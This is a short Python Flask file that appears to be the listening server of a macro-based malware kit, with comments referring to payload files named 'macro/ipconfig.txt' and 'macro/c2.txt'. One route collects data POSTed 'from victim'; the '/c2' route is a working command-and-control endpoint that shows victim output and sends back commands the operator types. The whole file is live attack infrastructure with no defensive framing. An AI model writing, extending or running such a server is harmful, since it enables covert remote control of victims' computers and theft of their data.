#                     ▄▄▌ ▐ ▄▌      ▄▄▄  ·▄▄▄▄   ▄▄▄· ▄▄▄·  ▄▄· 
#                     ██· █▌▐█▪     ▀▄ █·██▪ ██ ▐█ ▄█▐█ ▀█ ▐█ ▌▪
#                     ██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌ ██▀·▄█▀▀█ ██ ▄▄
#                     ▐█▌██▐█▌▐█▌.▐▌▐█•█▌██. ██ ▐█▪·•▐█ ▪▐▌▐███▌
#                     ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀▀▀▀▀▀• .▀    ▀  ▀ ·▀▀▀

import colorama
import json
from flask import Blueprint, request
from colorama import Fore, Back, Style
from flask.json import jsonify
from flask.templating import render_template

views = Blueprint("views", __name__)

# macro/ipconfig.txt
@views.route("/", methods=["POST"])
def home():
    print("")
    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Data from victim ~~~~~~~~~~~~~~~~~~~~")
    print(Fore.WHITE + str(request.data))
    print(Style.RESET_ALL)
    print("")
    return "Data recieved!"

# macro/c2.txt
@views.route("/c2", methods=["POST"])
def c2():
    print("")
    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Data from victim ~~~~~~~~~~~~~~~~~~~~")
    print(Fore.RED + "Connected to victim, send STOP to end the session")
    print(Fore.WHITE + str(request.data))
    print(Style.RESET_ALL)
    print("")
    dictToSend = input("")
    return dictToSend
